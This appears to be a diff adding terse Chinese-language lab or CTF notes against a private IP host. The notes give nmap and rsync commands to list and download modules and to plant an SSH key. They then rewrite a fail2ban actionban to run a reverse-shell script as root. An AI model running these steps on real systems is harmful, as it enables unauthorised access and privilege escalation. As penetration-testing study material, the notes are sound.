@@ -1,0 +1,20 @@
+nmap 192.168.93.126 -sV -sC -Pn >nmap.txt
+nmap 192.168.93.126 -p- > nmapall.txt
+
+
+1.nmap找到873起者rsync
+2.參考hacktrick文章https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
+查看目錄
+rsync -av --list-only rsync://192.168.93.126/
+nmap -sV --script "rsync-list-modules" -p 873 192.168.93.126
+下載檔案
+rsync -av  rsync://192.168.93.126/fox ./fox
+上傳公鑰
+rsync -av ./.ssh/ rsync://fox@192.168.93.126/fox/.ssh
+3.取得reverse shell後,發現有fail2ban服務,並且是root用戶起者
+4.查看fail2ban的配置文件有修改權限
+5.查看fail2ban的模式使用jail
+banaction_allports = iptables-allports
+6.修改ban後的動作action.d/iptables-multiport.conf.
+actionban = sh /tmp/reverse.sh
+7.ssh登入失敗後會被ban然後動作
